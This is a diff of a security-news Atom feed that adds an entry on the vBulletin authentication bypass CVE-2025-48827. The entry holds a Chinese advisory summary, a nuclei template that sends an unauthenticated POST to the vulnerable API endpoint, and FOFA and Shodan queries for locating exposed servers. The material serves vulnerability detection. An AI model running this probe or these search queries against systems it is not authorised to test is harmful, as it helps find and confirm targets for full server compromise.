@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-01T08:00:52.950Z</updated>
+  <updated>2025-07-01T09:00:25.036Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>vBulletin 认证绕过漏洞</title>
+    <link href="http://example.com/2025/07/01/github_1615167239/"/>
+    <id>http://example.com/2025/07/01/github_1615167239/</id>
+    <published>2025-07-01T09:00:25.037Z</published>
+    <updated>2025-07-01T09:00:25.036Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> vBulletin 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> vBulletin 5.0.0至5.7.5和6.0.0至6.0.3版本中存在一个认证绕过漏洞，由于在PHP 8.1或更高版本上对受保护的API控制器的未认证访问，允许未认证的攻击者远程调用受保护的方法。从PHP 8.1开始，由于对ReflectionMethod::invoke()及类似方法的内部调整，默认情况下允许使用PHP的Reflection API调用受保护&#x2F;私有方法。成功利用此漏洞允许未认证的远程攻击者以web服务器用户身份执行任意系统命令，导致系统完全被攻陷。</p><p><strong>产品厂商：</strong> vbulletin</p><p><strong>产品名称：</strong> vbulletin</p><p><strong>影响版本：</strong> 5.0.0 &lt;&#x3D; version &lt;&#x3D; 5.7.5, 6.0.0 &lt;&#x3D; version &lt;&#x3D; 6.0.3</p><p><strong>搜索语法：</strong> app&#x3D;”vBulletin”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/e3f24019bd74f8468f7bed7de049a5579f02998c/http%2Fcves%2F2025%2FCVE-2025-48827.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/e3f24019bd74f8468f7bed7de049a5579f02998c/http%2Fcves%2F2025%2FCVE-2025-48827.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">48827</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> vBulletin <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> <span class="hljs-operator">-</span> Authentication Bypass<br>  <span class="hljs-params">author:</span> pszyszkowski<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    vBulletin <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span> through <span class="hljs-number">5.7</span>.<span class="hljs-number">5</span> and <span class="hljs-number">6.0</span>.<span class="hljs-number">0</span> through <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain an authentication bypass caused by unauthenticated access to protected API controllers on PHP <span class="hljs-number">8.1</span> <span class="hljs-keyword">or</span> later, letting unauthenticated attackers invoke protected methods remotely.<br>    Starting from PHP <span class="hljs-number">8.1</span>, due to an internal adjustment to handling of ReflectionMethod::invoke() and similar methods, it now allows — by default — invocation of protected <span class="hljs-symbol">/</span> private methods when using PHP&#x27;s Reflection API.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation allows unauthenticated remote attackers to execute arbitrary system commands as the web server user, resulting <span class="hljs-keyword">in</span> full system compromise.<br>  <span class="hljs-params">remediation:</span> |<br>    Upgrade to vBulletin <span class="hljs-number">6.0</span>.<span class="hljs-number">4</span><span class="hljs-operator">+</span> before upgrading to PHP <span class="hljs-number">8.1</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-48827</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:vbulletin:vbulletin:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">10</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">48827</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">424</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> vbulletin<br>    <span class="hljs-params">product:</span> vbulletin<br>    <span class="hljs-params">fofa-query:</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;vBulletin&quot;</span><br>    <span class="hljs-params">shodan-query:</span> http.component:<span class="hljs-string">&quot;vBulletin&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,rce,vbulletin,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">rand_string:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_base(5))&#125;&#125;&quot;</span><br>  <span class="hljs-params">rand_value:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(5))&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/ajax/api/ad/wrapAdTemplate</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">template</span><span class="hljs-operator">=</span>&#123;&#123;rand_string&#125;&#125;&amp;id_name<span class="hljs-operator">=</span>&#123;&#123;rand_value&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span><br>          <span class="hljs-operator">-</span> contains_all(body,&#x27;<span class="hljs-operator">&lt;</span>div class<span class="hljs-operator">=</span>&#x27;,&#x27;&#123;&#123;rand_string&#125;&#125;&#x27;,&#x27;&#123;&#123;rand_value&#125;&#125;&#x27;,&#x27;<span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span>&#x27;)<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin 认证绕过漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+  </entry>
   
   <entry>
     <title>fofabot twitter update</title>
@@ -87,9 +114,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
     <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
@@ -114,9 +141,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
     <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
@@ -166,9 +193,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
     <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
@@ -519,33 +546,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>黑客入侵挪威大坝，导致闸门完全打开</title>
-    <link href="http://example.com/2025/07/01/weixin_1704553070/"/>
-    <id>http://example.com/2025/07/01/weixin_1704553070/</id>
-    <published>2025-07-01T06:04:46.111Z</published>
-    <updated>2025-07-01T06:04:46.106Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/yW_llW5Pz-iv1ICbv4QqGw">https://mp.weixin.qq.com/s/yW_llW5Pz-iv1ICbv4QqGw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/yW_llW5Pz-iv1ICbv4QqGw&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
